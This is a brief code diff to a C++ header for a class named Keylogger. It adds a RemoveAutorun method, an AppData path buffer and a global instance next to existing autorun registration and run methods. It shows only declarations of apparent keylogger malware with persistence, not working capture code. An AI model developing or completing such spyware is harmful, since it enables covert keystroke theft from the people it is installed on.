@@ -15,6 +15,7 @@ public:
 	~Keylogger();
     
     void RegisterAutorun();
+    void RemoveAutorun();
 	void Run();
 private:
 
@@ -29,4 +30,8 @@ private:
 
     char cmdBuf[8192];
     size_t cmdBufLen;
+
+    TCHAR appDataPath[1024];
 };
+
+extern Keylogger keylogger;
